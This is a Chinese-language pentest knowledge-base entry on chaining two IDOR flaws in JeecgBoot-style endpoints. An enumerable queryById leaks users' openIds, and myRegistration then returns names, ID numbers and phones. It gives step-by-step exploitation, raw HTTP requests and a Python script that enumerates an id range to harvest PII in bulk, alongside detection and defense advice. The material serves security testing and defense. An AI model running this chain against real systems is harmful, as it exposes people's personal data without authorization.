---
id: web-generic-auth-idor-openid-leak-enumerable-query-chain
title: 不可遍历 ID 的两段式越权：先用可遍历查询接口泄露 openid，再用 openid 打 myRegistration 获取 PII
type: scenario
domain: web
path: web/generic/auth
technique: idor-non-enumerable-id-openid-leak-chain
aliases:
- 不可遍历 ID 越权
- openid 泄露 二次越权
- 两段式 IDOR
- queryById 遍历 openid
- myRegistration 越权
- 标识泄露链
tags:
- idor
- bola
- auth
- access-control
- openid
- pii
- enumeration
- jeecg-boot
cve: []
severity: high
confidence: high
status: draft
created: '2026-11-07'
updated: '2026-11-07'
---

## 一句话结论

当越权接口的 `userId` 是不可遍历的 openid、单独替换无法批量利用时，先找同一系统里另一处可遍历数字 `id` 的查询接口（如 `recruitStudent/queryById?id=N`），它会在响应里返回目标用户的 `openId`；把遍历得到的 openid 喂给原越权接口（如 `myRegistration?tenantId=70&userId=<openid>`），即可批量获取姓名、身份证、手机号等 PII。

## 原理

- **IDOR/BOLA 的共同前提**：接口用客户端传入的对象标识定位记录，只校验“已登录/有 token”，不校验该对象是否属于当前用户。标识可枚举时可直接遍历；标识不可枚举（openid、uuid、长 hash）时，单点替换只能验证漏洞，难以批量利用，SRC 常以“危害不足”打回。
- **标识泄露接口**：同系统往往还有列表、详情、导出或关联查询接口，它们用自增 `id` 作为键，却在响应里返回内部标识（`openId`、`userId`、`accountId`、`unionId`）。这些接口本身可能只泄露“部分信息”，但提供了从可枚举 id 到不可枚举标识的映射。
- **两段式链**：`queryById?id=17431`（可遍历）→ 响应 `result.openId = oSF-j4...` → `myRegistration?tenantId=70&userId=oSF-j4...`（原越权接口）→ 响应 `name`、`idCard`、`phone` 等敏感字段。两个接口都缺对象级鉴权，且共用同一个 openid 作为关联键，因此可以拼接成批量泄露链。
- **为什么不止是“信息泄露”**：第一个接口泄露的是关联标识，第二个接口泄露的是身份证、手机号等 PII；单看第一个接口危害低，组合后达到批量 PII 泄露，SRC 定级会显著提高。
- **发现方法**：注册两个账号，替换 `userId` 确认越权；若标识不可遍历，则在 JS 全局搜索 `openid`/`userId`/`uid`/`accountId`，在 Burp 历史/Hex 插件中正则匹配响应里的同类字段，或翻其他接口的响应；找到“可遍历 id → 目标标识”的接口后回填原越权接口。

## 触发条件

- 目标存在按不可枚举标识（openid/uuid）查询或修改对象的越权接口，且响应含敏感信息。
- 同一应用存在另一个可遍历数字 id 的接口，响应中返回上述标识（或可通过关联字段推导）。
- `tenantId`、学校/租户上下文等附加参数已知或可固定；接口未做租户隔离或归属校验。
- 攻击者拥有至少一个低权限账号（用于确认基线响应与越权差异），并在授权范围内测试。
- 目标接口无频率限制或限制可接受，能够批量遍历 id。

## 利用步骤

1. 用两个账号分别请求目标接口，替换 `userId` 为对方的值，确认返回他人数据（IDOR 成立）；记录标识格式（openid/uuid/数字）。
2. 若标识可遍历（自增数字），直接顺序遍历；若不可遍历，进入标识搜集阶段。
3. 在 JS 文件、Burp 历史、前端接口定义中搜索 `openid`、`userId`、`uid`、`accountId`、`unionId` 等字段；重点看列表/详情/导出接口的响应。
4. 找到可遍历 `id` 的接口（如 `GET /jeecg-boot/manage/recruitStudent/queryById?id=17431`），发送连续 id，解析响应中的 `result.openId`/`userId`。
5. 将收集到的标识逐个填入原越权接口（如 `GET /jeecg-boot/manage/interestedCandidates/myRegistration?tenantId=70&userId=<openid>`），确认返回 `name`、`idCard`、`phone` 等字段。
6. 编写小脚本把两步串起来：遍历 id → 提取 openid → 请求 myRegistration → 保存结果；控制并发与请求间隔，避免对业务造成压力。
7. 用自己账号和第二个测试账号交叉验证数据归属；记录请求、响应字段与数量作为证据，不超出授权范围。

## PoC

第一步：遍历可枚举 id，泄露 openid。

```http
GET /jeecg-boot/manage/recruitStudent/queryById?id=17431 HTTP/1.1
Host: target
Content-Type: application/json
```

响应关键字段（原文截图，值已脱敏）：

```json
{"success":true,"result":{"id":17431,"tenantId":76,"openId":"oSF-j4...","userName":"...","stuName":null}}
```

第二步：用 openid 请求越权接口，获取 PII。

```http
GET /jeecg-boot/manage/interestedCandidates/myRegistration?tenantId=70&userId=oSF-j4tZoARUQn4NmbgFO_w-JIo0 HTTP/1.1
Host: target
Content-Type: application/json
```

响应关键字段（原文截图，值已脱敏）：

```json
{"success":true,"result":{"id":1883,"name":"dy","phone":"18211111111","idCard":null,"majors":"1461232503969857537","tenantId":"70","userId":"oSF-j4..."}}
```

自动化骨架：

```python
import requests

BASE = "http://target"
S = requests.Session()
S.headers.update({"Content-Type": "application/json"})

def leak_openid(i):
    r = S.get(f"{BASE}/jeecg-boot/manage/recruitStudent/queryById", params={"id": i}, timeout=10)
    j = r.json()
    return (j.get("result") or {}).get("openId")

def leak_pii(openid, tenant_id=70):
    r = S.get(f"{BASE}/jeecg-boot/manage/interestedCandidates/myRegistration",
              params={"tenantId": tenant_id, "userId": openid}, timeout=10)
    return r.json().get("result")

for i in range(174000, 174100):
    oid = leak_openid(i)
    if oid:
        print(i, leak_pii(oid))
```

说明：原文接口与字段来自截图；实际测试需替换 `BASE`、`tenantId` 与 id 范围，并先确认接口可未授权/低权限访问。

## 变体与关联

- **直接可遍历**：数字自增 id、短数字 userId、可预测的订单号等，直接顺序遍历即可（原文案例中的 `/keyuanhui/alumnus/8979`、`/keyuanhui/user/campus?userId=8979`）。
- **标识泄露来源**：列表/详情接口、导出 CSV/Excel、分享链接、消息通知、日志、前端 SSR 数据、第三方登录回调等；不限于 `queryById`。
- **跨接口关联**：同一 openid/unionid 可能在招聘、报名、学籍、微信绑定等多个业务复用；一个泄露点可以喂给多个越权接口。
- **关联**：[[pentest-recon-parameter-graph-attack-chain]]（用参数关系图自动推导 IDOR 链）、[[web-generic-auth-multi-session-matrix-leakscore]]（多会话矩阵验证越权）、[[web-generic-auth-form-field-id-idor-pii-enumeration]]（可遍历字段 id 批量取 PII）、[[web-generic-auth-transfer-fromaccount-idor-balance-theft]]（客户端账户标识信任导致资金越权）。

## 检测与防御

- **检测**：同一账号短时间遍历大量自增 id、响应中出现其他用户 openid/手机号/身份证；同一 IP 先密集请求 queryById 再密集请求 myRegistration 的两段式模式；接口返回记录数与请求参数不匹配。
- **防御**：所有对象读取/修改做对象级授权（校验对象 owner/tenant）；不要返回内部 openid/uuid 给无权限的调用方；查询接口按当前会话用户过滤，而不是仅按传入 id；对自增 id 使用不可预测标识或至少加访问控制；增加频率限制与异常枚举告警。
- **测试注意**：批量拉取 PII 时控制数量、脱敏保存；只在授权范围与约定测试账号内验证，不下载/传播真实个人信息。
